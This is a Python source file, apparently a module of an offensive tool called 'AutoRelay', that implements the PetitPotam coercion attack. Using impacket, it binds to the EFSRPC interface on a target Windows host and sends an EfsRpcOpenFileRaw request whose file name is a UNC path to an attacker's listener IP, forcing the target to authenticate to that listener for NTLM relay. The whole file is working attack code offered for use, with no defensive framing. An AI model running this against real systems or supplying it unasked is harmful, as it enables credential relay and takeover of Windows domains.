"""
AutoRelay — PetitPotam coercion module.
"""
from __future__ import annotations
import uuid
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import RPC_UNICODE_STRING
from util.log import get_logger

log = get_logger(__name__)
MS_EFSRPC_UUID = "c681d488-d850-11d0-8c52-00c04fd90f7e"

class EfsRpcOpenFileRaw(NDRCALL):
    opnum = 0
    structure = (('FileName', RPC_UNICODE_STRING), ('Flags', '<L=0'))

def trigger(target: str, listener_ip: str, username: str = "", password: str = "", domain: str = "", timeout: float = 8.0) -> bool:
    log.info(f"Triggering PetitPotam on {target}")
    string_binding = f"ncacn_ip_tcp:{target}"
    try:
        rpc_transport = transport.DCERPCTransportFactory(string_binding)
        rpc_transport.set_connect_timeout(timeout)
        if username:
            rpc_transport.set_credentials(username, password, domain)
        dce = rpc_transport.get_dce_rpc()
        dce.connect()
        dce.bind(uuid.UUID(MS_EFSRPC_UUID).bytes_le)
    except Exception as e:
        log.error(f"Failed to connect to EFSRPC: {e}")
        return False

    unc_path = f"\\\\{listener_ip}\\share\\test"
    try:
        request = EfsRpcOpenFileRaw()
        request['FileName'] = unc_path
        try: dce.request(request)
        except Exception as e: log.debug(f"Expected error: {e}")
        log.info("PetitPotam trigger sent.")
        return True
    except Exception as e:
        log.error(f"Trigger failed: {e}")
        return False
    finally:
        try: dce.disconnect()
        except: pass
